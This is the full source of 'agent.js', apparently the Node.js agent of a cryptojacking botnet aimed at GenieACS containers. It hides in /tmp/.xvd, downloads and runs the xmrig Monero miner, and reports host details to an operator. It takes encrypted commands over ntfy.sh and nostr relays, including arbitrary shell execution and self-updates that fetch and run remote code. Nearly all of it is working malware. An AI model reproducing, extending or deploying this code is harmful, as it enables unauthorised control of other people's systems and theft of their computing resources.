#!/usr/bin/env node
/* agent.js - xmrig fleet agent (node edition, zero dependencies)
 *
 * Same protocol as agent.py: ntfy bus, same config.json, same commands.
 * Exists because GenieACS containers always ship node but often ship no
 * python, no curl and no wget.
 *
 * Layout: /tmp/.xvd/{agent.js,config.json,state.json,agent.log,miner.log,xmrig}
 */
'use strict';
const fs = require('fs');
const path = require('path');
const os = require('os');
const cp = require('child_process');
const crypto = require('crypto');
const zlib = require('zlib');
const dgram = require('dgram');
const http = require('http');
const https = require('https');
const dns = require('dns');

const VERSION = '2.1.0';
const DIR = __dirname;
const CFG_PATH = path.join(DIR, 'config.json');
const STATE_PATH = path.join(DIR, 'state.json');
const BIN_PATH = path.join(DIR, 'xmrig');
const MINER_LOG = path.join(DIR, 'miner.log');
const AGENT_LOG = path.join(DIR, 'agent.log');
const PID_PATH = path.join(DIR, 'miner.pid');
const SEEN_PATH = path.join(DIR, 'seen.json');
const HOSTID_PATH = path.join(DIR, 'hostid');
const DNS_SERVERS = ['1.1.1.1', '8.8.8.8', '9.9.9.9'];
const dnsCache = {};

/* ------------------------------------------------------------------ util -- */
function log(msg) {
  const line = '[' + new Date().toISOString().replace('T', ' ').slice(0, 19) + '] ' + msg + '\n';
  try {
    fs.appendFileSync(AGENT_LOG, line);
    const st = fs.statSync(AGENT_LOG);
    if (st.size > 2000000) { try { fs.renameSync(AGENT_LOG, AGENT_LOG + '.1'); } catch (e) {} }
  } catch (e) {}
}

function loadJSON(p, def) {
  try { return JSON.parse(fs.readFileSync(p, 'utf8')); } catch (e) { return def || {}; }
}
function saveJSON(p, o) {
  const tmp = p + '.tmp';
  fs.writeFileSync(tmp, JSON.stringify(o));
  fs.renameSync(tmp, p);
}
function cfg() { return loadJSON(CFG_PATH, {}); }
function state() { return loadJSON(STATE_PATH, {}); }
function saveState(o) { const s = state(); Object.assign(s, o); saveJSON(STATE_PATH, s); }
function hostid() {
  try { return fs.readFileSync(HOSTID_PATH, 'utf8').trim(); } catch (e) { return ''; }
}
function sha256(buf) { return crypto.createHash('sha256').update(buf).digest('hex'); }

/* ------------------------------------------------------------------- dns -- */
function dnsQuery(name, server, cb) {
  const labels = name.split('.');
  const parts = [];
  const head = Buffer.alloc(12);
  head.writeUInt16BE(Math.floor(Math.random() * 65535), 0);
  head.writeUInt16BE(0x0100, 2);
  head.writeUInt16BE(1, 4);
  parts.push(head);
  for (const l of labels) {
    const b = Buffer.from(l, 'ascii');
    parts.push(Buffer.from([b.length]), b);
  }
  parts.push(Buffer.from([0]), Buffer.from([0, 1, 0, 1]));
  const q = Buffer.concat(parts);
  const sock = dgram.createSocket('udp4');
  let done = false;
  const finish = (ips) => { if (done) return; done = true; try { sock.close(); } catch (e) {} cb(ips); };
  const timer = setTimeout(() => finish([]), 3000);
  sock.on('message', (msg) => {
    clearTimeout(timer);
    const out = [];
    try {
      const ancount = msg.readUInt16BE(6);
      let off = 12;
      const skip = (o) => {
        while (true) {
          const l = msg[o];
          if (l === 0) return o + 1;
          if ((l & 0xc0) === 0xc0) return o + 2;
          o += 1 + l;
        }
      };
      off = skip(off) + 4;
      for (let i = 0; i < ancount; i++) {
        off = skip(off);
        const type = msg.readUInt16BE(off);
        const rdlen = msg.readUInt16BE(off + 8);
        off += 10;
        if (type === 1 && rdlen === 4) out.push(msg.slice(off, off + 4).join('.'));
        off += rdlen;
      }
    } catch (e) {}
    finish(out);
  });
  sock.on('error', () => finish([]));
  try { sock.send(q, 0, q.length, 53, server); } catch (e) { finish([]); }
}

function lookupFallback(hostname, opts, cb) {
  // node >= 20 calls this with {all:true} (happy eyeballs) and wants an array
  const all = !!(opts && opts.all);
  const done = (addr) => (all ? cb(null, [{ address: addr, family: 4 }]) : cb(null, addr, 4));
  if (dnsCache[hostname] && dnsCache[hostname].length) {
    return done(dnsCache[hostname][0]);
  }
  dns.lookup(hostname, { family: 4 }, (err, addr) => {
    if (!err && addr) { dnsCache[hostname] = [addr]; return done(addr); }
    let i = 0;
    const next = () => {
      if (i >= DNS_SERVERS.length) return cb(err || new Error('dns failed'));
      dnsQuery(hostname, DNS_SERVERS[i++], (ips) => {
        if (ips && ips.length) { dnsCache[hostname] = ips; return done(ips[0]); }
        next();
      });
    };
    next();
  });
}

function resolvePool(pool) {
  const i = pool.lastIndexOf(':');
  const host = pool.slice(0, i), port = pool.slice(i + 1);
  if (/^\d+\.\d+\.\d+\.\d+$/.test(host)) return Promise.resolve(pool);
  return new Promise((res) => {
    lookupFallback(host, {}, (err, addr) => res(err ? pool : addr + ':' + port));
  });
}

/* ------------------------------------------------------------------ http -- */
function request(url, opts, body, depth) {
  opts = opts || {};
  depth = depth || 0;
  return new Promise((resolve, reject) => {
    let u;
    try { u = new URL(url); } catch (e) { return reject(e); }
    const mod = u.protocol === 'https:' ? https : http;
    const o = {
      hostname: u.hostname,
      port: u.port || (u.protocol === 'https:' ? 443 : 80),
      path: u.pathname + u.search,
      method: opts.method || (body ? 'POST' : 'GET'),
      headers: Object.assign({ 'User-Agent': 'xvd/' + VERSION }, opts.headers || {}),
      lookup: lookupFallback,
      servername: u.hostname,
      timeout: opts.timeout || 25000,
    };
    if (body) o.headers['Content-Length'] = Buffer.byteLength(body);
    const r = mod.request(o, (res) => {
      if ([301, 302, 303, 307, 308].indexOf(res.statusCode) >= 0 && res.headers.location && depth < 5) {
        res.resume();
        const next = new URL(res.headers.location, url).toString();
        return request(next, opts, body, depth + 1).then(resolve, reject);
      }
      const chunks = [];
      res.on('data', (c) => chunks.push(c));
      res.on('end', () => resolve({ status: res.statusCode, body: Buffer.concat(chunks) }));
    });
    r.on('timeout', () => { r.destroy(new Error('timeout')); });
    r.on('error', reject);
    if (body) r.write(body);
    r.end();
  });
}

async function publish(topic, obj) {
  try {
    await request('https://ntfy.sh/' + topic, { headers: { 'Content-Type': 'text/plain' }, timeout: 20000 },
      JSON.stringify(obj));
    return true;
  } catch (e) { log('publish failed: ' + e.message); return false; }
}

async function poll(topic, since) {
  const url = 'https://ntfy.sh/' + topic + '/json?poll=1&since=' + since;
  let out = [], last = since;
  try {
    const r = await request(url, { timeout: 25000 });
    const txt = r.body.toString('utf8');
    for (const line of txt.split('\n')) {
      if (!line.trim()) continue;
      let m;
      try { m = JSON.parse(line); } catch (e) { continue; }
      if (m.event !== 'message') continue;
      last = m.id || last;
      try { out.push(JSON.parse(m.message)); } catch (e) {}
    }
  } catch (e) { log('poll failed: ' + e.message); }
  return [out, last];
}

/* ------------------------------------------------------------------ host -- */
function arch() {
  const a = os.arch();
  if (a === 'x64') return 'x86_64';
  if (a === 'arm64') return 'aarch64';
  return a;
}
function cores() {
  try { return os.availableParallelism ? os.availableParallelism() : os.cpus().length; }
  catch (e) { return os.cpus().length || 1; }
}
function ramGB() {
  return Math.round((os.totalmem() / 1073741824) * 10) / 10;
}

/* ----------------------------------------------------------------- miner -- */
function minerPid() {
  try {
    const pid = parseInt(fs.readFileSync(PID_PATH, 'utf8').trim(), 10);
    if (pid && fs.existsSync('/proc/' + pid)) {
      const cmd = fs.readFileSync('/proc/' + pid + '/cmdline', 'utf8');
      if (cmd.indexOf('xmrig') >= 0) return pid;
    }
  } catch (e) {}
  try {
    for (const d of fs.readdirSync('/proc')) {
      if (!/^\d+$/.test(d)) continue;
      try {
        const cmd = fs.readFileSync('/proc/' + d + '/cmdline', 'utf8');
        if (cmd.indexOf(BIN_PATH) >= 0) return parseInt(d, 10);
      } catch (e) {}
    }
  } catch (e) {}
  return null;
}

function minerSpeed() {
  try {
    const st = fs.statSync(MINER_LOG);
    const start = Math.max(0, st.size - 8000);
    const fd = fs.openSync(MINER_LOG, 'r');
    const buf = Buffer.alloc(st.size - start);
    fs.readSync(fd, buf, 0, buf.length, start);
    fs.closeSync(fd);
    const txt = buf.toString('utf8');
    const re = /speed 10s\/60s\/15m\s+(\S+)\s+(\S+)\s+(\S+)\s+H\/s/g;
    let m, best = null;
    while ((m = re.exec(txt)) !== null) {
      const v = m[2] !== 'n/a' ? m[2] : m[1];
      const f = parseFloat(v);
      if (!isNaN(f)) best = f;
    }
    return best;
  } catch (e) { return null; }
}

function stopMiner() {
  const pid = minerPid();
  if (!pid) return false;
  try { process.kill(pid, 'SIGTERM'); } catch (e) { return false; }
  const t0 = Date.now();
  while (Date.now() - t0 < 5000) {
    if (!fs.existsSync('/proc/' + pid)) return true;
    cp.execSync('sleep 0.2');
  }
  try { process.kill(pid, 'SIGKILL'); } catch (e) {}
  return true;
}

/* minimal tar reader: enough for the xmrig release tarball */
function untar(buf) {
  let off = 0;
  const out = [];
  while (off + 512 <= buf.length) {
    const name = buf.slice(off, off + 100).toString('utf8').replace(/\0.*$/, '');
    if (!name) break;
    const sizeStr = buf.slice(off + 124, off + 136).toString('ascii').replace(/\0.*$/, '').trim();
    const size = parseInt(sizeStr, 8) || 0;
    const type = String.fromCharCode(buf[off + 156]);
    const dataStart = off + 512;
    if (type === '0' || type === '\0') {
      out.push({ name, data: buf.slice(dataStart, dataStart + size) });
    }
    off = dataStart + Math.ceil(size / 512) * 512;
  }
  return out;
}

async function ensureBinary() {
  const c = cfg();
  const a = arch();
  const want = (c.sha256 || {})[a];
  if (fs.existsSync(BIN_PATH)) {
    try {
      if (!want || sha256(fs.readFileSync(BIN_PATH)) === want) return true;
    } catch (e) {}
  }
  const src = (c.sources || {})[a];
  if (!src) { log('no source for arch ' + a); return false; }
  try {
    log('downloading binary ' + src);
    const r = await request(src, { timeout: 180000 });
    if (r.status !== 200) { log('download http ' + r.status); return false; }
    let bin;
    if (/\.tar\.gz$|\.tgz$/.test(src)) {
      const files = untar(zlib.gunzipSync(r.body));
      const hit = files.find((f) => /(^|\/)xmrig$/.test(f.name));
      if (!hit) { log('xmrig not in archive'); return false; }
      bin = hit.data;
    } else if (/\.gz$/.test(src)) {
      bin = zlib.gunzipSync(r.body);
    } else {
      bin = r.body;
    }
    fs.writeFileSync(BIN_PATH, bin);
    fs.chmodSync(BIN_PATH, 0o755);
    if (want && sha256(bin) !== want) { log('sha mismatch'); fs.unlinkSync(BIN_PATH); return false; }
    log('binary ready');
    return true;
  } catch (e) { log('binary download failed: ' + e.message); return false; }
}

async function startMiner() {
  const c = cfg();
  if (!c.wallet) return 'no wallet';
  if (!(await ensureBinary())) return 'binary unavailable';
  stopMiner();
  const total = cores();
  const hint = parseInt(c.hint || 60, 10);
  const threads = c.threads || Math.max(1, Math.floor(total * hint / 100));
  const mode = (c.mode && c.mode !== 'auto') ? c.mode : (ramGB() >= 2.6 ? 'fast' : 'light');
  const pool = await resolvePool(c.pool || 'gulf.moneroocean.stream:10128');
  const args = ['-o', pool, '-u', c.wallet, '-p', (c.worker || (hostid() || os.hostname())).replace(/[:\/]/g, '_'),
    '-a', c.algo || 'rx/0', '--donate-level', String(c.donate || 1),
    '--cpu-max-threads-hint', String(hint), '--randomx-mode', mode,
    '--print-time', String(c.print_time || 30), '--log-file', MINER_LOG, '--no-color',
    '--threads', String(threads)];
  try {
    const fd = fs.openSync(MINER_LOG, 'a');
    fs.writeSync(fd, '\n--- start ' + new Date().toISOString() + ' ---\n');
    const p = cp.spawn(BIN_PATH, args, { detached: true, stdio: ['ignore', fd, fd], cwd: DIR });
    p.unref();
    fs.writeFileSync(PID_PATH, String(p.pid));
    saveState({ threads, mode, started: Math.floor(Date.now() / 1000) });
    log('miner started pid=' + p.pid + ' threads=' + threads + ' mode=' + mode + ' pool=' + pool);
    return 'started';
  } catch (e) { log('start failed: ' + e.message); return 'start failed'; }
}

function status() {
  const c = cfg(); const pid = minerPid(); const st = state();
  let load = null; try { load = Math.round(os.loadavg()[0] * 100) / 100; } catch (e) {}
  return {
    type: 'status', ver: VERSION, id: hostid() || os.hostname(), host: os.hostname(),
    ip: localIP(), arch: arch(), cores: cores(), ram: ramGB(),
    os: (os.type() + ' ' + os.release()).slice(0, 60),
    mining: !!pid, pid: pid, hr: minerSpeed(),
    threads: st.threads || null, mode: st.mode || null,
    uptime: pid ? Math.floor(Date.now() / 1000) - (st.started || Math.floor(Date.now() / 1000)) : 0,
    load: load, hint: c.hint || null,
    wallet: (c.wallet || '').slice(0, 6) + '...' + (c.wallet || '').slice(-4),
    ts: Math.floor(Date.now() / 1000),
  };
}

function localIP() {
  try {
    const ifs = os.networkInterfaces();
    for (const k of Object.keys(ifs)) for (const i of ifs[k]) {
      if (i.family === 'IPv4' && !i.internal) return i.address;
    }
  } catch (e) {}
  return '';
}


/* ------------------------------------------------------------ nostr bus -- */
const N_ = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141n;
const P_ = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2Fn;
const GX = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798n;
const GY = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8n;
const modp = (a, m) => { const r = a % m; return r >= 0n ? r : r + m; };
function invp(a, m) {
  let [r0, r1] = [modp(a, m), m], [s0, s1] = [1n, 0n];
  while (r1 !== 0n) { const q = r0 / r1; [r0, r1] = [r1, r0 - q * r1]; [s0, s1] = [s1, s0 - q * s1]; }
  return modp(s0, m);
}
function padd(p, q) {
  if (!p) return q; if (!q) return p;
  if (p[0] === q[0]) {
    if (modp(p[1] + q[1], P_) === 0n) return null;
    const l = modp(3n * p[0] * p[0] * invp(2n * p[1], P_), P_);
    const x = modp(l * l - 2n * p[0], P_);
    return [x, modp(l * (p[0] - x) - p[1], P_)];
  }
  const l = modp((q[1] - p[1]) * invp(q[0] - p[0], P_), P_);
  const x = modp(l * l - p[0] - q[0], P_);
  return [x, modp(l * (p[0] - x) - p[1], P_)];
}
function pmul(k, p) { let r = null, a = p; while (k > 0n) { if (k & 1n) r = padd(r, a); a = padd(a, a); k >>= 1n; } return r; }
const b32 = (n) => Buffer.from(n.toString(16).padStart(64, '0'), 'hex');
function tagHash(tag, msg) {
  const th = crypto.createHash('sha256').update(tag).digest();
  return crypto.createHash('sha256').update(Buffer.concat([th, th, msg])).digest();
}
function schnorrSign(skHex, msgHex) {
  const d0 = BigInt('0x' + skHex);
  const Pt = pmul(d0, [GX, GY]);
  const d = (Pt[1] & 1n) ? modp(-d0, N_) : d0;
  let k0;
  do { k0 = BigInt('0x' + crypto.randomBytes(32).toString('hex')) % N_; } while (k0 === 0n);
  const Rt = pmul(k0, [GX, GY]);
  const k = (Rt[1] & 1n) ? modp(-k0, N_) : k0;
  const e = BigInt('0x' + tagHash('BIP0340/challenge',
    Buffer.concat([b32(Rt[0]), b32(Pt[0]), Buffer.from(msgHex, 'hex')])).toString('hex')) % N_;
  return Buffer.concat([b32(Rt[0]), b32(modp(k + e * d, N_))]).toString('hex');
}
function xonlyPub(skHex) {
  const Pt = pmul(BigInt('0x' + skHex), [GX, GY]);
  return b32(Pt[0]).toString('hex');
}

function aesEncrypt(pskHex, obj) {
  const key = Buffer.from(pskHex, 'hex');
  const iv = crypto.randomBytes(12);
  const c = crypto.createCipheriv('aes-256-gcm', key, iv);
  const ct = Buffer.concat([c.update(JSON.stringify(obj), 'utf8'), c.final()]);
  return Buffer.concat([iv, ct, c.getAuthTag()]).toString('base64');
}
function aesDecrypt(pskHex, b64) {
  const raw = Buffer.from(b64, 'base64');
  const d = crypto.createDecipheriv('aes-256-gcm', Buffer.from(pskHex, 'hex'), raw.slice(0, 12));
  d.setAuthTag(raw.slice(raw.length - 16));
  return JSON.parse(Buffer.concat([d.update(raw.slice(12, raw.length - 16)), d.final()]).toString('utf8'));
}

function wsConnect(url, onOpen, onMessage, onClose) {
  const u = new URL(url);
  const sock = require('tls').connect({
    host: u.hostname, port: Number(u.port || 443), servername: u.hostname,
    lookup: lookupFallback, rejectUnauthorized: true,
  });
  let buf = Buffer.alloc(0), open = false;
  const key = crypto.randomBytes(16).toString('base64');
  const frame = (op, payload) => {
    const len = payload.length;
    let head;
    if (len < 126) { head = Buffer.alloc(2); head[1] = 0x80 | len; }
    else if (len < 65536) { head = Buffer.alloc(4); head[1] = 0x80 | 126; head.writeUInt16BE(len, 2); }
    else { head = Buffer.alloc(10); head[1] = 0x80 | 127; head.writeBigUInt64BE(BigInt(len), 2); }
    head[0] = 0x80 | op;
    const mask = crypto.randomBytes(4);
    const out = Buffer.alloc(payload.length);
    for (let i = 0; i < payload.length; i++) out[i] = payload[i] ^ mask[i % 4];
    return Buffer.concat([head, mask, out]);
  };
  sock.on('secureConnect', () => {
    sock.write('GET ' + (u.pathname || '/') + ' HTTP/1.1\r\nHost: ' + u.hostname +
      '\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: ' + key +
      '\r\nSec-WebSocket-Version: 13\r\nUser-Agent: xvd\r\n\r\n');
  });
  sock.on('data', (d) => {
    buf = Buffer.concat([buf, d]);
    if (!open) {
      const i = buf.indexOf('\r\n\r\n');
      if (i < 0) return;
      if (buf.slice(0, i).toString().indexOf(' 101') < 0) { sock.destroy(); return; }
      open = true; buf = buf.slice(i + 4);
      if (onOpen) onOpen(api);
    }
    for (;;) {
      if (buf.length < 2) return;
      const b0 = buf[0], b1 = buf[1], op = b0 & 0x0f, masked = (b1 & 0x80) !== 0;
      let len = b1 & 0x7f, off = 2;
      if (len === 126) { if (buf.length < 4) return; len = buf.readUInt16BE(2); off = 4; }
      else if (len === 127) { if (buf.length < 10) return; len = Number(buf.readBigUInt64BE(2)); off = 10; }
      const ml = masked ? 4 : 0;
      if (buf.length < off + ml + len) return;
      const payload = Buffer.from(buf.slice(off + ml, off + ml + len));
      if (masked) { const m = buf.slice(off, off + 4); for (let i = 0; i < payload.length; i++) payload[i] ^= m[i % 4]; }
      buf = buf.slice(off + ml + len);
      if (op === 1) { try { onMessage(payload.toString()); } catch (e) {} }
      else if (op === 9) { try { sock.write(frame(0xA, payload)); } catch (e) {} }
      else if (op === 8) { sock.destroy(); return; }
    }
  });
  sock.on('error', () => {});
  sock.on('close', () => { if (onClose) onClose(); });
  const api = {
    send: (t) => { try { sock.write(frame(1, Buffer.from(t))); } catch (e) {} },
    close: () => { try { sock.destroy(); } catch (e) {} },
  };
  return api;
}

function makeEvent(nostrCfg, content, tagSuffix) {
  const sk = nostrCfg.fleet_sk;
  const ev = {
    pubkey: xonlyPub(sk), created_at: Math.floor(Date.now() / 1000),
    kind: nostrCfg.kind || 30078,
    tags: [['t', (nostrCfg.tag || 'xvd') + (tagSuffix || '')]],
    content: content,
  };
  const ser = JSON.stringify([0, ev.pubkey, ev.created_at, ev.kind, ev.tags, ev.content]);
  ev.id = crypto.createHash('sha256').update(ser).digest('hex');
  ev.sig = schnorrSign(sk, ev.id);
  return ev;
}

function publishNostr(nostrCfg, obj, tagSuffix) {
  return new Promise((resolve) => {
    let ev;
    try { ev = makeEvent(nostrCfg, aesEncrypt(nostrCfg.psk, obj), tagSuffix); }
    catch (e) { log('nostr sign failed: ' + e.message); return resolve(0); }
    const raw = JSON.stringify(['EVENT', ev]);
    let done = 0, sent = 0;
    const relays = nostrCfg.relays || [];
    if (!relays.length) return resolve(0);
    const finish = () => { if (done >= Math.min(2, relays.length)) resolve(sent); };
    for (const r of relays.slice(0, 4)) {
      let closed = false;
      const t = setTimeout(() => { if (!closed) { closed = true; done++; finish(); } }, 6000);
      try {
        wsConnect(r, (api) => { api.send(raw); sent++; log('nostr sent to ' + r); },
          (m) => { log('nostr relay reply ' + String(m).slice(0, 80)); }, () => {});
      } catch (e) { log('nostr connect failed ' + r + ' ' + e.message); }
      setTimeout(() => { if (!closed) { closed = true; done++; finish(); } }, 4000);
    }
    setTimeout(() => resolve(sent), 7000);
  });
}

/* --------------------------------------------------------------- commands -- */
function seenHas(id) { return (loadJSON(SEEN_PATH, { ids: [] }).ids || []).indexOf(id) >= 0; }
function seenAdd(id) {
  const s = loadJSON(SEEN_PATH, { ids: [] });
  s.ids = (s.ids || []).concat([id]).slice(-300);
  saveJSON(SEEN_PATH, s);
}
function matches(target) {
  if (!target || target === 'all' || target === '*') return true;
  const me = os.hostname().toLowerCase(), ip = localIP(), hid = hostid().toLowerCase();
  for (const raw of String(target).toLowerCase().split(',')) {
    const p = raw.trim();
    if (!p) continue;
    if (p === 'all' || p === '*') return true;
    if (p === me || p === ip || (hid && p === hid)) return true;
    if (p.indexOf('arch:') === 0 && arch() === p.slice(5)) return true;
    if (p.indexOf('host:') === 0 && me.indexOf(p.slice(5)) === 0) return true;
  }
  return false;
}

async function selfUpdate(args) {
  // never accept the python payload: this process runs agent.js
  const url = args.url_js;
  if (!url) return 'no js url';
  try {
    const r = await request(url, { timeout: 120000 });
    const got = sha256(r.body);
    const want = args.sha_js;
    if (want && got !== want) return 'sha mismatch';
    const txt = r.body.toString('utf8');
    if (txt.indexOf('#!') !== 0) return 'not a script';
    const nw = path.join(DIR, 'agent.js.new');
    fs.writeFileSync(nw, r.body);
    fs.chmodSync(nw, 0o755);
    fs.renameSync(nw, path.join(DIR, 'agent.js'));
    log('updated to ' + (args.ver || '?') + ', restarting');
    await publish(cfg().stat_topic, {
      type: 'ack', id: 'update', action: 'update', host: os.hostname(),
      ok: 'updated to ' + (args.ver || '?'), ts: Math.floor(Date.now() / 1000),
    });
    const p = cp.spawn(process.execPath, [path.join(DIR, 'agent.js')],
      { detached: true, stdio: 'ignore', cwd: DIR });
    p.unref();
    setTimeout(() => process.exit(0), 500);
    return 'updated';
  } catch (e) { return 'update failed: ' + e.message; }
}

async function handle(cmd) {
  const id = cmd.id;
  if (!id || seenHas(id)) return null;
  if (!matches(cmd.target)) return null;
  seenAdd(id);
  const a = cmd.args || {};
  const res = { type: 'ack', id: id, action: cmd.action, host: os.hostname(),
    h: hostid() || os.hostname(), ip: localIP(), ts: Math.floor(Date.now() / 1000), ok: null };
  try {
    switch (cmd.action) {
      case 'ping': res.ok = 'pong'; break;
      case 'start': res.ok = await startMiner(); break;
      case 'stop': res.ok = stopMiner() ? 'stopped' : 'was not running'; break;
      case 'restart': stopMiner(); await new Promise(r => setTimeout(r, 1000)); res.ok = await startMiner(); break;
      case 'set': {
        const c = cfg(); Object.assign(c, a); saveJSON(CFG_PATH, c);
        res.ok = 'config saved';
        if (minerPid()) { stopMiner(); await new Promise(r => setTimeout(r, 1000)); await startMiner(); }
        break;
      }
      case 'status': Object.assign(res, status()); res.type = 'ack'; res.id = id; break;
      case 'logs': {
        const st = fs.statSync(MINER_LOG);
        const start = Math.max(0, st.size - 4000);
        const fd = fs.openSync(MINER_LOG, 'r');
        const b = Buffer.alloc(st.size - start);
        fs.readSync(fd, b, 0, b.length, start);
        fs.closeSync(fd);
        res.ok = b.toString('utf8').split('\n').slice(-(a.lines || 40)).join('\n').slice(-1500);
        break;
      }
      case 'exec': {
        const out = cp.execSync(a.cmd || 'id', { shell: '/bin/sh', timeout: 25000, maxBuffer: 1 << 20 });
        res.ok = out.toString('utf8').slice(-1500);
        break;
      }
      case 'update': res.ok = await selfUpdate(a); break;
      case 'uninstall': {
        stopMiner();
        try { cp.execSync("crontab -l 2>/dev/null | grep -v xvd | crontab - 2>/dev/null"); } catch (e) {}
        await publish(cfg().stat_topic, res);
        try { fs.rmSync(DIR, { recursive: true, force: true }); } catch (e) {}
        process.exit(0);
        break;
      }
      default: res.ok = 'unknown action';
    }
  } catch (e) { res.ok = 'error: ' + e.message; }
  return res;
}

/* ------------------------------------------------------------------- main -- */
function killDuplicates() {
  try {
    const target = path.join(DIR, 'agent.js');
    for (const d of fs.readdirSync('/proc')) {
      if (!/^\d+$/.test(d)) continue;
      const pid = Number(d);
      if (pid === process.pid || pid === process.ppid) continue;
      try {
        const parts = fs.readFileSync('/proc/' + d + '/cmdline', 'utf8').split('\u0000').filter(Boolean);
        if (parts.length < 2) continue;
        const exe = parts[0];
        if (exe.indexOf('node') < 0) continue;           // never the shell
        const arg = parts[1];
        if (arg !== target && arg !== 'agent.js' && !arg.endsWith('/agent.js')) continue;
        process.kill(pid, 'SIGKILL');
        log('killed duplicate agent ' + pid);
      } catch (e) {}
    }
  } catch (e) {}
}

function startNostr(c0) {
  const n = c0.nostr || {};
  if (!n.relays || !n.bot_pub) { log('nostr not configured, commands disabled'); return; }
  const tag = n.tag || 'xvd';
  const sub = JSON.stringify(['REQ', 'xvd', {
    kinds: [n.kind || 1], authors: [n.bot_pub], limit: 20,
  }]);
  log('nostr sublen ' + Buffer.byteLength(sub));
  const onEvent = async (msg) => {
    let m; try { m = JSON.parse(msg); } catch (e) { log('nostr raw ' + String(msg).slice(0,60)); return; }
    if (m[0] !== 'EVENT') log('nostr ns ' + String(m[0]));
    if (m[0] !== 'EVENT' || !m[2]) return;
    const ev = m[2];
    if (ev.pubkey !== n.bot_pub) return;
    let cmd;
    try { cmd = aesDecrypt(n.psk, ev.content); }
    catch (e) { return; }
    log('nostr cmd ' + cmd.action + ' ' + cmd.id);
    const res = await handle(cmd);
    if (res) await publishNostr(n, res, '-stat');
  };
  const relayLoop = (r) => {
    const go = () => {
      let iv = null;
      try {
        wsConnect(r, (api) => {
          log('nostr connected ' + r);
          api.send(sub);
          if (iv) clearInterval(iv);
          iv = setInterval(() => api.send(sub), 90000);
        }, onEvent, () => {
          if (iv) clearInterval(iv);
          setTimeout(go, 5000 + Math.floor(Math.random() * 10000));
        });
      } catch (e) { setTimeout(go, 10000); }
    };
    go();
  };
  log('nostr sub ' + sub);
  for (const r of n.relays) relayLoop(r);
  log('nostr: subscribed on ' + n.relays.length + ' relays as ' + (hostid() || os.hostname()));
}

async function main() {
  const c0 = cfg();
  killDuplicates();
  log('agent.js ' + VERSION + ' starting arch=' + arch() + ' cores=' + cores() + ' ram=' + ramGB());
  if (c0.autostart !== false) await startMiner();
  startNostr(c0);
  setInterval(async () => {
    const c = cfg();
    if (!minerPid() && c.autostart !== false) { log('miner died, restarting'); await startMiner(); }
  }, 60000);
  setInterval(async () => {
    const c = cfg();
    await publishNostr(c.nostr || {}, status(), '-stat');
  }, parseInt(c0.stat_sec || 300, 10) * 1000);
  setInterval(async () => {
    await publishNostr(cfg().nostr || {}, status(), '-stat');
  }, 120000).unref();
}

main();
